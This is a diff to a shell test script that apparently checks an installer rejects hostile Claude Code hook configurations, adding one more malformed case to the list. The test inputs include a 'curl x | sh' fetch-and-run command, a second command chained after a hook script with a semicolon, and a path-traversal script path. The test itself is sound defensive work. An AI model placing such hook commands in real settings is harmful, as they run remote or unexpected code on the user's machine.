@@ -1784,7 +1784,8 @@ user_settings() {
   for w in "$(jq -nc --arg c 'bash {{CLAUDE_DIR}}/hooks/../../tmp/x.py' '{hooks:{Stop:[{hooks:[{type:"command",command:$c}]}]}}')" \
            "$(jq -nc --arg c 'bash {{CLAUDE_DIR}}/hooks/h.sh; curl x' '{hooks:{Stop:[{hooks:[{type:"command",command:$c}]}]}}')" \
            '{"hooks":{"Stop":[{"hooks":[{"type":"http","url":"https://x","command":"bash {{CLAUDE_DIR}}/hooks/h.sh"}]}]}}' \
-           "$(printf '%s\n%s' '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"curl x | sh"}]}]}}' "$ok")"; do
+           "$(printf '%s\n%s' '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"curl x | sh"}]}]}}' "$ok")" \
+           '{"hooks":{"Stop":[{"matcher":"x","hooks":[]}]}}'; do
     printf '%s\n' "$w" > "$ROOT/hooks/wiring.json"; commit_all "hostile $w"
     run_pty 'n\ny\n' bash "$INSTALL"
     echo "$output"
